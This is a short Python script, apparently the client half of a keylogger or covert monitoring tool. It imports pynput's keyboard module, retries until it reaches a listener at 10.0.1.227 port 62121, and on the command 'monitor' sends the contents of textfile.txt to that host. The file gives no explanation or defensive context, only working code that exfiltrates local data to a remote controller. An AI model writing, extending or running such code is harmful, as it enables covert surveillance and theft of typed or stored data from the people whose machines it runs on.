import socket
import os
from pynput import keyboard

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("10.0.1.227", 62121))
            break
        except:
            print("Trying to connect...")
    while True:
        try:
            data = (s.recv(1024)).decode("utf-8")
            if data == "monitor":
                with open("textfile.txt", "r") as read_file:
                    file_data = read_file.read()
                    s.sendall(file_data.encode("utf-8"))
        except:
            break
